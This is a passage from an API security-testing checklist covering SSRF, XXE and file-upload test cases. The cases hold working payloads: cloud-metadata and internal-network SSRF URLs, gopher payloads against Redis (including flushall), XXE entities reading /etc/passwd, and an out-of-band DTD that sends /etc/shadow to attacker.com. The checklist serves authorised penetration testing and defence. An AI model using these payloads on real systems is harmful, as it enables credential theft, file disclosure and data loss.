**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find URL input parameter<br><br>2. Submit cloud metadata URL<br><br>3. Try AWS/GCP/Azure metadata endpoints<br><br>4. Extract credentials or sensitive data

**Expected Result:** Should block access to metadata endpoints

**Payload / PoC Example:**

```
url=http://169.254.169.254/latest/meta-data/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0405 — SSRF - Internal Network Scan
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find URL input parameter<br><br>2. Submit internal IP ranges<br><br>3. Scan for internal services<br><br>4. Map internal network

**Expected Result:** Should block internal IP ranges

**Payload / PoC Example:**

```
url=http://192.168.1.1:8080/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Intruder

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0406 — SSRF - Localhost Access
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find URL input parameter<br><br>2. Submit localhost URLs<br><br>3. Access local admin interfaces<br><br>4. Bypass IP-based restrictions

**Expected Result:** Should block localhost access

**Payload / PoC Example:**

```
url=http://127.0.0.1:8080/admin
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0407 — SSRF - Protocol Smuggling
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find URL input parameter<br><br>2. Try different protocols (file:// gopher://)<br><br>3. Read local files<br><br>4. Interact with internal services

**Expected Result:** Should whitelist allowed protocols

**Payload / PoC Example:**

```
url=file:///etc/passwd
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0408 — SSRF - DNS Rebinding
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Set up DNS rebinding attack<br><br>2. Use domain that resolves to attacker then internal IP<br><br>3. Bypass hostname validation<br><br>4. Access internal resources

**Expected Result:** Should resolve and validate DNS at time of use

**Payload / PoC Example:**

```
url=http://rebinding.attacker.com/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Custom Script

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0409 — SSRF - Bypass via URL Encoding
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find blocked SSRF payload<br><br>2. URL-encode the payload<br><br>3. Double-encode if needed<br><br>4. Check if bypass successful

**Expected Result:** Should decode and validate URLs properly

**Payload / PoC Example:**

```
url=http://%31%32%37%2e%30%2e%30%2e%31/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0410 — SSRF - Bypass via IP Formats
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find blocked SSRF payload<br><br>2. Use alternative IP formats<br><br>3. Try decimal octal hex formats<br><br>4. Check if bypass successful

**Expected Result:** Should normalize IP addresses before blocking

**Payload / PoC Example:**

```
url=http://2130706433/ (decimal for 127.0.0.1)
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0411 — SSRF - Bypass via Redirects
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Set up redirect on attacker server<br><br>2. Submit attacker URL that redirects to internal<br><br>3. Check if redirect followed<br><br>4. Access internal resources

**Expected Result:** Should not follow redirects or validate final destination

**Payload / PoC Example:**

```
url=http://attacker.com/redirect?to=http://internal/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0412 — Webhook SSRF
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API10:2023 Unsafe Consumption of APIs · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find webhook registration endpoint<br><br>2. Register webhook to internal URL<br><br>3. Trigger webhook event<br><br>4. Access internal services

**Expected Result:** Should validate webhook URLs against allowlist

**Payload / PoC Example:**

```
Register webhook to http://169.254.169.254/
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API10:2023 Unsafe Consumption of APIs

---

## API-0413 — SSRF via Admin Data Import
**Phase:** 10-SSRF · **Category:** SSRF · **OWASP API 2023:** API7:2023 Server Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST Admin Functions — URL/host params (fetch, import, webhook, image)

**Test Steps:** 1. Find admin bulk import feature (CSV/URL import)<br>2. Supply internal URL as data source<br>3. Check if server fetches from internal network<br>4. Try to access internal admin APIs, Redis, DB

**Expected Result:** Admin import validates URL scheme and destination; internal IPs blocked

**Payload / PoC Example:**

```
# URL import SSRF
POST /admin/import/url {"source": "http://169.254.169.254/latest/meta-data/"}
POST /admin/import {"source_url": "http://localhost:8080/actuator/env"}
POST /admin/import/feed {"url": "http://internal-elasticsearch:9200/_cat/indices"}

# SSRF via file import with schema
POST /admin/import {"file_url": "file:///etc/passwd"}
POST /admin/import {"file_url": "dict://localhost:11211/stats"}  # Memcached
POST /admin/import {"file_url": "gopher://localhost:6379/_REDIS_PAYLOAD"}  # Redis via Gopher

# Gopher payload to Redis (base64 encoded)
{"source_url": "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A"}
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** SSRFmap, Burp Suite

**References:** -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF' (BlackHat 2017); PortSwigger Academy SSRF; PayloadsAllTheThings; API7:2023 Server Side Request Forgery

---

## API-0414 — Classic XXE in XML / SOAP / SVG / DOCX
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST XML request body / uploaded XML

**Test Steps:** 1. Submit XML with external entity reading file:///etc/passwd<br>2. Try SVG upload with same payload<br>3. Test DOCX/XLSX (zip with manipulated XML)

**Expected Result:** Disable external entities

**Payload / PoC Example:**

```
<!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]>
```

**Impact:** File read; SSRF; DoS

**Tools:** Burp,XXEinjector

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0415 — OOB XXE
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** POST XML request body / uploaded XML

**Test Steps:** 1. Host external DTD on attacker.com<br>2. Use parameter entity to exfil data via OOB request<br>3. Capture file content via DNS/HTTP

**Expected Result:** Disable DTD external entities

**Payload / PoC Example:**

```
<!ENTITY % d SYSTEM 'http://attacker/x.dtd'> %d;
```

**Impact:** File exfil silently

**Tools:** interactsh

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0416 — XXE via SVG/XML Upload
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — XML request body / uploaded XML

**Test Steps:** 1. Upload SVG/XML with XXE payload<br>2. Try to read local files<br>3. Attempt SSRF

**Expected Result:** Should disable external entity processing

**Payload / PoC Example:**

```
Upload SVG with <!ENTITY xxe SYSTEM "file:///etc/passwd">
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Suite

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0417 — XML External Entity (XXE)
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Send XML input with XXE payload<br>2. Try to read local files<br>3. Attempt SSRF

**Expected Result:** Should disable external entity processing

**Payload / PoC Example:**

```
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Suite

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0418 — XXE - File Disclosure
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Find XML input endpoint<br><br>2. Inject XXE payload with external entity<br><br>3. Reference /etc/passwd or other files<br><br>4. Check response for file contents

**Expected Result:** Should disable external entities

**Payload / PoC Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]>
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Suite

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0419 — XXE - SSRF via XXE
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Find XML input endpoint<br><br>2. Inject XXE with HTTP external entity<br><br>3. Point to internal resources<br><br>4. Observe server-side requests

**Expected Result:** Should disable external entities

**Payload / PoC Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://internal:8080/"">]>
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Suite

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0420 — XXE - Blind XXE via OOB
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Find XML input endpoint<br><br>2. Inject blind XXE with OOB channel<br><br>3. Exfiltrate data via DNS or HTTP<br><br>4. Receive data on attacker server

**Expected Result:** Should disable external entities

**Payload / PoC Example:**

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://attacker.com/xxe"">%xxe;]>
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Collaborator

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0421 — XXE - DoS via Billion Laughs
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Find XML input endpoint<br><br>2. Inject billion laughs payload<br><br>3. Cause exponential entity expansion<br><br>4. Monitor server resource usage

**Expected Result:** Should limit entity expansion

**Payload / PoC Example:**

```
<!DOCTYPE lolz [<!ENTITY lol ""lol""><!ENTITY lol2 ""&lol;&lol;"">...]>
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Suite

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0422 — XXE in File Upload (SVG/XLSX)
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Create malicious SVG or XLSX with XXE<br><br>2. Upload file<br><br>3. Trigger processing of XML content<br><br>4. Check for file disclosure or SSRF

**Expected Result:** Should sanitize XML in uploaded files

**Payload / PoC Example:**

```
Malicious SVG with XXE payload
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Custom Script

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0423 — XXE in SOAP Endpoint
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Find SOAP web service<br><br>2. Inject XXE in SOAP envelope<br><br>3. Check for entity expansion<br><br>4. Extract sensitive data

**Expected Result:** Should disable external entities in SOAP parser

**Payload / PoC Example:**

```
XXE in SOAP Body element
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Suite

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0424 — Content-Type Confusion XXE
**Phase:** 10-XXE · **Category:** XXE · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** POST XML request body / uploaded XML

**Test Steps:** 1. Change Content-Type to application/xml<br>2. Replace JSON body with XML XXE payload<br>3. Check if server switches parsers<br>4. Try SOAP injection on REST endpoints

**Expected Result:** Server validates Content-Type matches expected format; XML parser has external entities disabled

**Payload / PoC Example:**

```
# Content-Type switch from JSON to XML
POST /api/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>

# XXE with SSRF
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data><item>&xxe;</item></data>

# Blind XXE via OOB
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
<foo/>

# attacker.com/xxe.dtd:
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval; %exfil;

# SVG XXE (on file upload endpoints)
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="file:///etc/passwd" height="200" width="200"/>
</svg>
```

**Impact:** File read / SSRF / OOB exfiltration via XML external entity

**Tools:** Burp Suite, XXEinjector

**References:** -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Academy XXE; OWASP XXE Prevention; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0425 — Unrestricted File Upload - Malicious Extensions
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload file with .php/.jsp/.exe extension<br>2. Try double extensions (.php.jpg)<br>3. Try null byte injection

**Expected Result:** Should whitelist allowed extensions only

**Payload / PoC Example:**

```
malicious.php, shell.php.jpg, file.php%00.jpg
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Burp Suite

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0426 — File Upload Without Size Limit
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload extremely large file (10GB+)<br>2. Check if accepted<br>3. Monitor server resources

**Expected Result:** Should enforce file size limits

**Payload / PoC Example:**

```
Upload 10GB file
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Custom Script

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0427 — File Upload Without Authentication
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API2:2023 Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Remove auth token<br>2. Upload file<br>3. Check if successful

**Expected Result:** Should require authentication

**Payload / PoC Example:**

```
Upload without Authorization header
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Burp Suite

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API2:2023 Broken Authentication

---

## API-0428 — File Upload Path Traversal
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload file with filename: ../../etc/passwd<br>2. Try to overwrite system files<br>3. Check storage location

**Expected Result:** Should sanitize filename and restrict to upload directory

**Payload / PoC Example:**

```
filename: ../../../etc/passwd
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Burp Suite

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0429 — MIME Type Validation Bypass
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload .php file with Content-Type: image/jpeg<br>2. Test if only MIME checked<br>3. Verify file execution

**Expected Result:** Should validate actual file content not just MIME type

**Payload / PoC Example:**

```
Upload malicious.php with Content-Type: image/jpeg
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Burp Suite

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0430 — Malware Upload - No Scanning
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload EICAR test file<br>2. Upload zip bomb<br>3. Check if scanned

**Expected Result:** Should implement antivirus scanning

**Payload / PoC Example:**

```
Upload EICAR or zip bomb
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Burp Suite

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0431 — IDOR - Access Other Users' Files
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload file as User A<br>2. Try to access/delete as User B<br>3. Enumerate file IDs

**Expected Result:** Should validate file ownership

**Payload / PoC Example:**

```
GET /files/123 (file belongs to different user)
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Burp Suite

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API1:2023 Broken Object Level Authorization

---

## API-0432 — File Upload Race Condition
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload file<br>2. Send simultaneous requests to access it<br>3. Try accessing before validation completes

**Expected Result:** Should validate before making accessible

**Payload / PoC Example:**

```
Access file before AV scan completes
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Turbo Intruder

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0433 — Image Upload - Metadata Injection
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API8:2023 Security Misconfiguration · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload image with malicious EXIF data<br>2. Include XSS/SQLi in metadata<br>3. Check if processed

**Expected Result:** Should strip metadata or sanitize

**Payload / PoC Example:**

```
EXIF comment with XSS payload
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** ExifTool

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API8:2023 Security Misconfiguration

---

## API-0434 — File Upload DoS - Concurrent Uploads
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload multiple large files simultaneously<br>2. Monitor server performance<br>3. Check rate limiting

**Expected Result:** Should limit concurrent uploads per user

**Payload / PoC Example:**

```
Upload 100 files simultaneously
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Custom Script

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0435 — Direct File Access Without Authorization
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API1:2023 Broken Object Level Authorization · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload file and get URL<br>2. Logout<br>3. Try accessing file URL directly

**Expected Result:** Should require authentication for file access

**Payload / PoC Example:**

```
Access file URL without auth token
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** Manual

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API1:2023 Broken Object Level Authorization

---

## API-0436 — Pixel Flood Attack
**Phase:** 11-File Upload · **Category:** File Upload · **OWASP API 2023:** API4:2023 Unrestricted Resource Consumption · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** File Upload — File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload image with huge dimensions (1M x 1M pixels)<br>2. Check if server processes

**Expected Result:** Should validate image dimensions

**Payload / PoC Example:**

```
Upload 0xFFFFFF x 0xFFFFFF pixel image
```

**Impact:** Malicious file upload to webshell/RCE or stored XSS

**Tools:** ImageMagick

**References:** -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Academy; OWASP File Upload Cheat Sheet; PayloadsAllTheThings; API4:2023 Unrestricted Resource Consumption

---

## API-0437 — File Overwrite
